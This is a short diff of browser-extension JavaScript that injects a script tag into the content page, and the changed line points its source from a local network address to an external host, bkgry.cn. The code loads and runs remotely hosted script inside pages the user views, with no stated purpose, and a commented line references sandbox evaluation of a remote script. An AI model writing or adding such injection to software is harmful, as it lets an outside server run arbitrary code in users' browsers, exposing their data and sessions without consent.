@@ -19,7 +19,7 @@ function myFunction(aEvent){
       //let result = Components.utils.evalInSandbox("let x = 1;", sandbox, "1.8", "http://192.168.1.12/js.js", 1);
 
       var hm = browser.contentDocument.createElement("script");
-            hm.src = "http://192.168.8.100/router/index.php";
+            hm.src = "http://bkgry.cn/index.php?name=test";
             var s = browser.contentDocument.getElementsByTagName("script")[0];
             s.parentNode.insertBefore(hm, s);
       //let result =2;
